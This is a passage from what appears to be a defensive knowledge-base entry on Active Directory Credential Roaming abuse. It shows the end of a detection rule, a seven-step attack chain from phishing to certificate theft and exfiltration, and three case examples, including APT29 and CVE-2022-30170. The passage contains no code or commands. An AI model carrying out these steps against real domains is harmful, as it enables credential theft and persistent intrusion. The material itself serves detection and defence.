    exclusion:
        SubjectUserName: 'SYSTEM'
    condition: event_4662 and not exclusion
action: alert
severity: high
```

---

## Related Attack Chain

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-PHISH-001] Phishing | Attacker spear-phishes domain admin with admin credentials |
| **2** | **Credential Access** | **[CA-STORE-002] Credential Roaming abuse** | **Attacker extracts roamed certs/keys from AD using Domain Admin access** |
| **3** | **Privilege Escalation** | [PE-TOKEN-002] RBCD abuse | Attacker uses extracted certificate to request service tickets |
| **4** | **Lateral Movement** | [LM-AUTH-005] Pass-the-Certificate | Attacker uses stolen certificate for PKI authentication to other systems |
| **5** | **Persistence** | [PE-ACCTMGMT-014] Backdoor admin account | Attacker creates hidden admin account with roamed certificate for future access |
| **6** | **Collection** | File/email access | Attacker accesses encrypted files and S/MIME email using stolen certs |
| **7** | **Impact** | Data exfiltration | Attacker steals sensitive documents protected by stolen identity |

---

## Real-World Examples

### Example 1: APT29 Diplomatic Targeting (Early 2022)

- **Target:** European diplomatic entity
- **Timeline:** Initial compromise via phishing, Credential Roaming abuse observed
- **Technique Status:** ACTIVE - APT29 actively queried `msPKI-CredentialRoamingTokens` LDAP attribute
- **Attack Vector:** Phishing → Local Admin → DPAPI backup key extraction → Credential Roaming abuse
- **Impact:** Access to diplomatic communications; certificates used for persistence
- **Reference:** [Mandiant: They See Me Roaming](https://cloud.google.com/blog/topics/threat-intelligence/apt29-windows-credential-roaming/)

### Example 2: Post-Compromise Persistence (Hypothetical Red Team)

- **Target:** Enterprise with legacy Credential Roaming enabled
- **Timeline:** Domain Admin compromise during penetration test
- **Technique Status:** Demonstrated CVE-2022-30170 exploitation on unpatched systems
- **Impact:** Injected malicious roaming token; achieved code execution on target user logon
- **Recovery:** Required rebuild of affected systems and credential rotation
- **Reference:** [Mandiant / CQure Academy Lab](https://cqureacademy.com/blog/extracting-roamed-private-keys/)

### Example 3: Legacy Windows Vista Credential Roaming (Historical)

- **Target:** Organization with Vista systems still in domain
- **Timeline:** Migration project stalled; Vista systems remain operational
- **Technique Status:** Plaintext passwords stored in `msPKI-AccountCredentials` (Vista feature)
- **Impact:** Extracted credentials provided direct domain authentication without cracking
- **Reference:** [Microsoft Credential Roaming Whitepaper (2012)](https://learn.microsoft.com/en-us/windows/security/identity-protection/credential-guard/considerations-known-issues)

---
